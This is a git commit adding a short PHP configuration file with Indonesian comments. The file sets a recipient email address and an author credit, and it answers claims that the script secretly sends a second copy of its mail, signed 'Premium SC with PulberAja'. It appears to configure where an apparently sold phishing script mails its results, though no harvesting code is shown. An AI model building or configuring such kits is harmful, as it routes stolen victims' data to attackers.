68f791fd027da3e5df35e0d3925ef6acd851f710
fathur0905 <93516834+fathur0905@users.noreply.github.com>
2023-06-23 11:38:32 +0700

    sip

---
+++ myfolder/email.php
@@ -0,0 +1,20 @@
+<?php
+
+$pulberaja = 'pulberaja5@gmail.com'; // GANTI EMAIL KAMU DISINI
+
+
+$pembuat = 'PulberAja'; //Jangan di hapus kalo gak mau rusak
+
+?>
+
+
+
+<!-- TUTORIAL -->
+
+<?php
+$tutorial = 'BERGUNA LAH'
+
+// Bila ingin tahu send 2 mail tidak nya silahkan cek di Track Delivery di cPanel agar tau anda para perusak reputasi yang bialng send 2 mail
+// Premium SC with PulberAja
+// Pembuat: Nanang
+?>
